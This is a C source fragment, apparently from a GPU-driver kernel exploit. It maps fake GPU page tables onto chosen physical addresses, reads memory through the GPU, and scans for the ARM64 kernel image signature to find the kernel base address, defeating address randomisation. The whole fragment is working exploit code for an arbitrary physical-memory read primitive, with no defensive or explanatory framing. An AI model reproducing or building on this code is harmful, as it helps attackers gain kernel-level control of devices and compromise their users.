...
int cheese_gpu_rw_setup(struct cheese_gpu_rw* cheese) {
    ...
    if (getenv("CHEESE_SCAN")) {
        const char *s1 = getenv("CHEESE_SCAN_START"), *s2 = getenv("CHEESE_SCAN_END"), *s3 = getenv("CHEESE_SCAN_STEP");
        uint64_t pa_start = strtoull(s1 ? s1 : "0x80000038", NULL, 0);
        uint64_t pa_end   = strtoull(s2 ? s2 : "0xc0000038", NULL, 0);
        uint64_t step     = strtoull(s3 ? s3 : "0x200000",   NULL, 0);
        fprintf(stderr, "SCAN 0x%lx .. 0x%lx step 0x%lx\n", pa_start, pa_end, step);
        uint32_t tag = 0x1000;
        int hits = 0;
        for (uint64_t pa = pa_start; pa < pa_end; pa += step) {
            if (setup_pagetables(target_physical_page, 1, phyaddr, kFakeGpuAddr, pa & ~0xfffull)) break;
            sync_cache_to_gpu(target_physical_page, target_physical_page + 0x1000);
            tag++; g_marker = tag;
            if (DoWrite(fd, ctx_id, payload_buf, payload_gpuaddr, phyaddr,
                        kFakeGpuAddr + 0x1100, /*write=*/false,
                        kFakeGpuAddr + (pa & 0xfff), 1, NULL)) { continue; }
            int ok = 0;
            for (int t = 0; t < 3000; t++) {
                sync_cache_from_gpu(target_physical_page, target_physical_page + 0x1000);
                if (*(volatile uint32_t *)((char *)target_physical_page + 0x100) == tag) { ok = 1; break; }
                usleep(200);
            }
            uint32_t v = *(uint32_t *)((char *)target_physical_page + 0x104);
            if (ok && v == 0x644d5241u) {
                fprintf(stderr, "*** KERNEL IMAGE MAGIC at 0x%lx  => kernel_base=0x%lx\n", pa, pa - 0x38);
                hits++;
            }
        }
        fprintf(stderr, "SCAN DONE hits=%d\n", hits);
        exit(0);
    }
